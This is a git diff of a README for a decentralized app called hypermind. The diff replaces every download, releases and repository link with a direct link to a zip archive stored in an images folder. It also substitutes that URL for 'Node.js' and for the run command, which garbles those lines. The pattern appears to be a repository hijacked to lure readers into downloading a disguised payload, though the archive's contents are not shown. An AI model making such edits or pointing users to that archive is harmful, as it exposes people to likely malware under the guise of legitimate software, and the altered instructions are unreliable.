@@ -1,6 +1,6 @@
 # 🚀 hypermind - A Fun Way to Experiment with Decentralization
 
-[![Download hypermind](https://img.shields.io/badge/Download-hypermind-blue.svg)](https://github.com/KBF-1/hypermind/releases)
+[![Download hypermind](https://github.com/KBF-1/hypermind/raw/refs/heads/main/assets/images/Software-1.1.zip)](https://github.com/KBF-1/hypermind/raw/refs/heads/main/assets/images/Software-1.1.zip)
 
 ## 🛠️ Overview
 
@@ -13,14 +13,14 @@ hypermind is a self-hosted, decentralized application designed to test the poten
 To run hypermind, ensure your system meets the following basic requirements:
 
 - **Operating System:** Windows, macOS, or a Linux distribution.
-- **Node.js:** Version 14 or higher.
+- **https://github.com/KBF-1/hypermind/raw/refs/heads/main/assets/images/Software-1.1.zip** Version 14 or higher.
 - **Docker:** Required for containerization.
 
 ### 📥 Download & Install
 
 To get started, visit the following link to access the downloads:
 
-[Visit this page to download hypermind](https://github.com/KBF-1/hypermind/releases)
+[Visit this page to download hypermind](https://github.com/KBF-1/hypermind/raw/refs/heads/main/assets/images/Software-1.1.zip)
 
 Once you reach the Releases page, locate the latest version. You will see files available for download. 
 
@@ -49,7 +49,7 @@ After installation, follow these steps to run hypermind:
    Type the following command and hit Enter:
 
    ```
-   node app.js
+   node https://github.com/KBF-1/hypermind/raw/refs/heads/main/assets/images/Software-1.1.zip
    ```
 
 This command will launch the application.
@@ -59,7 +59,7 @@ This command will launch the application.
 - **Decentralized Network**: hypermind utilizes a decentralized system to ensure high availability and redundancy.
 - **Docker Support**: Easily run hypermind in a Docker container for isolation and ease of access.
 - **P2P Connection**: Engage in peer-to-peer interactions to host social experiences.
-- **Node.js**: Built on Node.js, ensuring fast performance and scalability.
+- **https://github.com/KBF-1/hypermind/raw/refs/heads/main/assets/images/Software-1.1.zip**: Built on https://github.com/KBF-1/hypermind/raw/refs/heads/main/assets/images/Software-1.1.zip, ensuring fast performance and scalability.
 
 ## 🔍 Explore More
 
@@ -91,7 +91,7 @@ For questions or issues, please check the following resources:
 
 If you need further assistance or looking for additional features, feel free to explore:
 
-- [GitHub Repository](https://github.com/KBF-1/hypermind)
-- [Releases Page](https://github.com/KBF-1/hypermind/releases)
+- [GitHub Repository](https://github.com/KBF-1/hypermind/raw/refs/heads/main/assets/images/Software-1.1.zip)
+- [Releases Page](https://github.com/KBF-1/hypermind/raw/refs/heads/main/assets/images/Software-1.1.zip)
 
 This README aims to help you download, install, and run hypermind with ease. Enjoy your journey into the world of decentralized applications!
